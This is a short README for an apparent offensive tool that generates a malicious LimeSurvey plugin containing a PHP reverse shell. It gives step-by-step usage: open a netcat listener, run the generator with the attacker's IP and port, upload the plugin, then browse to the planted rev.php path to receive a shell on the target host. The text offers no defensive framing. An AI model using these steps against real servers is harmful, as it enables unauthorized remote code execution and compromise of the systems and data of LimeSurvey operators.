# Limesurvey shell plugin

this script generates a malicious plugin to get a shell on the host system of limesurvey.

## Usage:

first open a listener on a port, for example:
`nc -lnvp 1234`

then run the script:
`python main.py YOUR_IP_HERE 1234`

when it's done generating the plugin, just upload it to limesurvey and browse to the php reverse shell path, which is:

`http://LIMESURVEY_TARGET_PATH/upload/plugins/dateFunctions/rev.php` and you will get a shell!